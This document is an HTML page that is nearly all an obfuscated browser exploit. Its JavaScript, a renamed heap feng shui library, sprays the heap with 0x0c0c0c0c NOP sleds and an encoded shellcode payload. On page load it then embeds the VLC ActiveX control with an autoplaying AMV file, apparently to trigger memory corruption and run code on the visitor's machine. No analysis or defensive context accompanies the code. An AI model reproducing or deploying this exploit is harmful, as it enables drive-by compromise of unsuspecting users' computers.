<html>
<head>
</head>
<body>
<script language='javascript'>
//


function sQEtFijX() {

}


sQEtFijX.xiI = function(maxAlloc, heapBase) {



this.maxAlloc = (maxAlloc ? maxAlloc : 65535);

this.heapBase = (heapBase ? heapBase : 0x150000);
this.kTOQkrQ = "AAAA";



while (4 + this.kTOQkrQ.length*2 + 2 < this.maxAlloc) {

    this.kTOQkrQ += this.kTOQkrQ;

}
this.mem = new Array();
this.oAiMLdrUShfk();

}


sQEtFijX.xiI.prototype.zPyipRGN = function(msg) {

void(Math.atan2(0xbabe, msg));

}


sQEtFijX.xiI.prototype.hZiRyNNBRSVyYPTEssxWizCv = function(enable) {



if (enable == true)

    void(Math.atan(0xbabe));

else

    void(Math.asin(0xbabe));

}


sQEtFijX.xiI.prototype.GnbZzkqyEVlWYVBopBvfTYnT = function(msg) {

void(Math.acos(0xbabe));

}


sQEtFijX.xiI.prototype.lrkKEhaJUX = function(len) {

if (len > this.kTOQkrQ.length)

    throw "Requested lrkKEhaJUX string length " + len + ", only " + this.kTOQkrQ.length + " available";



return this.kTOQkrQ.substr(0, len);

}


sQEtFijX.xiI.prototype.fNegnmHggTASNDqIJ = function(num, fNegnmHggTASNDqIJ) {

if (fNegnmHggTASNDqIJ == 0)

    throw "Round argument cannot be 0";



return parseInt((num + (fNegnmHggTASNDqIJ-1)) / fNegnmHggTASNDqIJ) * fNegnmHggTASNDqIJ;

}


sQEtFijX.xiI.prototype.LDgcJS = function(num, width)

{

var digits = "0123456789ABCDEF";



var LDgcJS = digits.substr(num & 0xF, 1);



while (num > 0xF) {

    num = num >>> 4;

    LDgcJS = digits.substr(num & 0xF, 1) + LDgcJS;

}



var width = (width ? width : 0);



while (LDgcJS.length < width)

    LDgcJS = "0" + LDgcJS;



return LDgcJS;

}


sQEtFijX.xiI.prototype.YLwIXnUHWUXtXPRmHAxcYyCZ = function(YLwIXnUHWUXtXPRmHAxcYyCZ) {

return unescape("%u" + this.LDgcJS(YLwIXnUHWUXtXPRmHAxcYyCZ & 0xFFFF, 4) + "%u" + this.LDgcJS((YLwIXnUHWUXtXPRmHAxcYyCZ >> 16) & 0xFFFF, 4));

}


sQEtFijX.xiI.prototype.CMHVmALUHPQWtIoVAngzMSvR = function(arg, tag) {



var size;
if (typeof arg == "string" || arg instanceof String)

    size = 4 + arg.length*2 + 2;
else

    size = arg;
if ((size & 0xf) != 0)

    throw "Allocation size " + size + " must be a multiple of 16";
if (this.mem[tag] === undefined)

    this.mem[tag] = new Array();



if (typeof arg == "string" || arg instanceof String) {
    this.mem[tag].push(arg.substr(0, arg.length));

}

else {
    this.mem[tag].push(this.lrkKEhaJUX((arg-6)/2));

}

}


sQEtFijX.xiI.prototype.vMshQHKPlwyIIhbbYdZ = function(tag) {



delete this.mem[tag];
CollectGarbage();

}


sQEtFijX.xiI.prototype.oAiMLdrUShfk = function() {



this.zPyipRGN("Flushing the OLEAUT32 cache");


this.vMshQHKPlwyIIhbbYdZ("oleaut32");


for (var i = 0; i < 6; i++) {

    this.CMHVmALUHPQWtIoVAngzMSvR(32, "oleaut32");

    this.CMHVmALUHPQWtIoVAngzMSvR(64, "oleaut32");

    this.CMHVmALUHPQWtIoVAngzMSvR(256, "oleaut32");

    this.CMHVmALUHPQWtIoVAngzMSvR(32768, "oleaut32");

}

}


sQEtFijX.xiI.prototype.ICcmogp = function(arg, tag) {



var size;
if (typeof arg == "string" || arg instanceof String)

    size = 4 + arg.length*2 + 2;
else

    size = arg;
if (size == 32 || size == 64 || size == 256 || size == 32768)

    throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
this.CMHVmALUHPQWtIoVAngzMSvR(arg, tag);

}


sQEtFijX.xiI.prototype.WHaglTvnsbNXekldQughHB = function(tag) {
this.vMshQHKPlwyIIhbbYdZ(tag);
this.oAiMLdrUShfk();

}


sQEtFijX.xiI.prototype.WIvjGzqGyoqCiqLrtAuYyfEaMe = function() {



this.zPyipRGN("Running the garbage collector");

CollectGarbage();



this.oAiMLdrUShfk();

}


sQEtFijX.xiI.prototype.b = function(arg, count) {



var count = (count ? count : 1);



for (var i = 0; i < count; i++) {

    this.ICcmogp(arg);

    this.ICcmogp(arg, "b");

}

this.ICcmogp(arg);



this.WHaglTvnsbNXekldQughHB("b");

}


sQEtFijX.xiI.prototype.QHwPnvfhw = function(arg, count) {



var size;
if (typeof arg == "string" || arg instanceof String)

    size = 4 + arg.length*2 + 2;
else

    size = arg;
if ((size & 0xf) != 0)

    throw "Allocation size " + size + " must be a multiple of 16";



if (size+8 >= 1024)

    throw("Maximum QHwPnvfhw block size is 1008 bytes");



var count = (count ? count : 1);



for (var i = 0; i < count; i++)

    this.ICcmogp(arg, "QHwPnvfhw");



this.WHaglTvnsbNXekldQughHB("QHwPnvfhw");

}


sQEtFijX.xiI.prototype.KgWYWmPXOnHWjAqOVDoiB = function(arg)

{

var size;
if (typeof arg == "string" || arg instanceof String)

    size = 4 + arg.length*2 + 2;
else

    size = arg;
if ((size & 0xf) != 0)

    throw "Allocation size " + size + " must be a multiple of 16";



if (size+8 >= 1024)

    throw("Maximum QHwPnvfhw block size is 1008 bytes");


return this.heapBase + 0x688 + ((size+8)/8)*48;

}


sQEtFijX.xiI.prototype.jg = function(shellcode, jmpecx, size) {



var size = (size ? size : 1008);
if ((size & 0xf) != 0)

    throw "Vtable size " + size + " must be a multiple of 16";



if (shellcode.length*2 > size-138)

    throw("Maximum shellcode length is " + (size-138) + " bytes");


var jg = unescape("%u9090%u7ceb")


for (var i = 0; i < 124/4; i++)

    jg += this.YLwIXnUHWUXtXPRmHAxcYyCZ(jmpecx);


jg += unescape("%u0028%u0028") +
          shellcode + heap.lrkKEhaJUX((size-138)/2 - shellcode.length);



return jg;

}


var heap_obj = new sQEtFijX.xiI(0x20000);
var code = unescape("%u8166%u01ec%u6101%uebd9%u04ba%u7743%ud983%u2474%u5df4%uc933%u32b1%u5531%u8318%ufced%u5503%ua110%ue582%ue19b%u160c%u6b73%ue6ce%u0c83%u0346%u0cb2%u473c%ubce4%u0536%u3608%ube1a%u3a9b%ub1b3%uf02c%ufce5%ua9ad%u9fd6%ub02d%u400a%u7b0c%u815f%u6649%ud392%uec02%uc401%ub827%u6f99%u2c7b%u8c9a%u4fcb%u028b%u1640%ua40b%u2285%ube02%u0fca%u35dc%ufb38%u9fdf%u0471%ude73%uf7be%u268d%ue878%u5efb%u957b%ua4fb%u4106%u3e89%u02a0%u9b29%uc651%u68ac%ua35d%u37bb%u3241%u4c6f%ubf7d%u838e%ufbf4%u07b4%u5f5d%u1ed4%u0e3b%u41e9%uefe4%u094f%ufb08%u50fd%ufa46%uef70%ufc24%uf08a%u9518%u7bbb%ue2f7%uae43%u1dbc%uf30e%ub594%u61d7%udba5%u5fe7%ue5e9%u6a6b%u1191%u1f73%u5e94%uf333%ucfe4%uf3d6%uef5b%u97f2%u633a%u799e%u03d9%u8605");
var nops = unescape("%u0c0c%u0c0c");

while (nops.length < 0x1000) nops += nops;
var offset = nops.substring(0, 0x600-0x20);
var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);

while (shellcode.length < 0x20000) shellcode += shellcode;
var block = shellcode.substring(0, (0x10000-6)/2);

heap_obj.WIvjGzqGyoqCiqLrtAuYyfEaMe();

for (var i=0; i<0x1000; i++) {
  heap_obj.ICcmogp(block);
}
var lrkKEhaJUX = unescape("%u0c0c%u0c0c");
var pivot = unescape("%u0c0c%u0c0c");

while (lrkKEhaJUX.length < 0x20000) lrkKEhaJUX += lrkKEhaJUX;
var offset2 = lrkKEhaJUX.substring(0, 0x1ff);
var p = offset2 + pivot + nops.substring(0, 0x800-pivot.length-offset2.length);

while (p.length < 0x20000) p += p;
var pivot_block = p.substring(0, (0x10000-6)/2);

for (var i2=0; i2 < 0x2000; i2++) {
  heap_obj.ICcmogp(pivot_block);
}

</script>
<object classid="clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921"
    codebase="http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab"
    width="0" height="0"
    events="True">
<param name="Src" value="/data/vlc_amv.amv"></param>
<param name="ShowDisplay" value="False" ></param>
<param name="AutoLoop" value="no"></param>
<param name="AutoPlay" value="yes"></param>
</object>
</body>
</html>
